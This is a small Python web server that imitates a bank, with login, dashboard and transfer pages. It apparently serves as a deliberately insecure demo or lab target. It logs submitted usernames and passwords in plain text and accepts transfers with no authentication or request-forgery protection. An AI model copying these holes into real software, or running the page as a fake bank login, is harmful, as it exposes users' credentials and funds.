import http.server
import socketserver
import datetime
import os

PORT = 8080
LOG_FILE = "/tmp/server_log.txt"

HTML_LOGIN = """
<html>
<head><title>Secure Bank Login</title><style>body{background:#f0f2f5;font-family:Arial;} .login-box{width:300px;margin:100px auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);}</style></head>
<body>
    <div class="login-box">
        <h2>Bank Login</h2>
        <form method="POST" action="/login">
            User: <input type="text" name="user"><br><br>
            Pass: <input type="password" name="pass"><br><br>
            <input type="submit" value="Login">
        </form>
    </div>
</body>
</html>
"""

HTML_DASHBOARD = """
<html>
<body>
    <h2>Welcome to your Dashboard</h2>
    <p>Balance: $1,250.00</p>
    <a href="/transfer">Transfer Money</a>
</body>
</html>
"""

HTML_TRANSFER = """
<html>
<body>
    <h2>Transfer Money</h2>
    <form method="POST" action="/transfer">
        Amount: <input type="text" name="amount"><br>
        To: <input type="text" name="account"><br>
        <input type="submit" value="Send">
    </form>
</body>
</html>
"""

class BankHandler(http.server.BaseHTTPRequestHandler):
    def log_action(self, method, path, extra=""):
        ts = datetime.datetime.now().strftime('%H:%M:%S')
        log_line = f"[{ts}] [{method}] {path} | {extra} | from={self.client_address[0]}\n"
        with open(LOG_FILE, "a") as f:
            f.write(log_line)
        print(log_line.strip())

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        if self.path == "/":
            self.wfile.write(HTML_LOGIN.encode())
            self.log_action("GET", "/")
        elif self.path == "/dashboard":
            self.wfile.write(HTML_DASHBOARD.encode())
            self.log_action("GET", "/dashboard")
        elif self.path == "/transfer":
            self.wfile.write(HTML_TRANSFER.encode())
            self.log_action("GET", "/transfer")
        else:
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        self.send_response(302)
        if self.path == "/login":
            self.send_header("Location", "/dashboard")
            self.end_headers()
            params = {x.split('=')[0]: x.split('=')[1] for x in post_data.split('&')}
            extra = f"user={params.get('user','')} pass={params.get('pass','')}"
            self.log_action("POST", "/login", extra)
        elif self.path == "/transfer":
            self.send_header("Location", "/dashboard")
            self.end_headers()
            params = {x.split('=')[0]: x.split('=')[1] for x in post_data.split('&')}
            extra = f"amount={params.get('amount','')} to={params.get('account','')}"
            self.log_action("POST", "/transfer", extra)

if __name__ == '__main__':
    with socketserver.TCPServer(("", PORT), BankHandler) as httpd:
        print(f"Bank Server starting on port {PORT}...")
        httpd.serve_forever()
